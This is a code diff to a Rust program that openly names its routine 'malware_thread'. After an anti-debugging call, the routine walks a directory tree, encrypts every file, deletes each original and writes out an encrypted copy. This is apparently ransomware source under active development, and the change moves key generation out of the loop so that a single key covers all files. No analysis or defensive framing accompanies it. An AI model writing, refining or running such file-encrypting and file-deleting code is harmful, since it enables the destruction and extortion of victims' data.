@@ -105,11 +105,11 @@ fn generate_key_pair() -> ([u8;32],[u8;16]){
 
 fn malware_thread(base_dir:&str){
     prevent_debugging();
+    let (key,iv) = generate_key_pair();
     for entry in WalkDir::new(base_dir).into_iter().filter_map(|e| e.ok()){
         //println!("{}",entry.clone().path().display());
         if entry.path().is_file(){
             let data = get_data_from_file(&entry.clone().path().to_str().expect("failed to convert to str"));
-            let (key,iv) = generate_key_pair();
             let encrypted = encrypt_data(&data, &key, &iv);
             fs::remove_file(entry.clone().path().to_str().expect("msg")).expect("failed to delete file");
             let mut new_path = entry.clone().path().display().to_string();
